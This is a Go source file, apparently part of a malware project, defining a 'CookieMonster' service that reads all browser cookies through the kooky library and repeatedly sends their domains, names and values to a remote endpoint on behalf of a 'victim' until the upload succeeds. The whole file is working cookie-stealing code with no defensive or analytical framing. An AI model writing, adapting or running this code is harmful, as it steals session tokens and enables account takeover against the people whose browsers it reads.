package services

import (
	"fmt"
	"github.com/zellyn/kooky"
	_ "github.com/zellyn/kooky/allbrowsers"
	"main/network"
	"sync"
	"time"
)

type CookieMonster struct {
	Mutex   *sync.Mutex
	cookies []*kooky.Cookie
}

func (c *CookieMonster) Start() {
	c.Mutex.Lock()
	c.cookies = kooky.ReadCookies()
	c.Mutex.Unlock()
}

func (c *CookieMonster) Communicate(victim string) {
	for {
		time.Sleep(4 * time.Second)
		c.Mutex.Lock()
		if len(c.cookies) > 0 {
			var rez string
			for _, cookie := range c.cookies {
				rez += fmt.Sprintf("%s, %s, %s\n", cookie.Domain, cookie.Name, cookie.Value)
			}
			c.Mutex.Unlock()
			_, err := network.HandleTextRequest(rez, "cookies", victim)
			if err != nil {
				fmt.Println("Error sending the request")
			} else {
				break
			}
		} else {
			c.Mutex.Unlock()
		}
	}
}
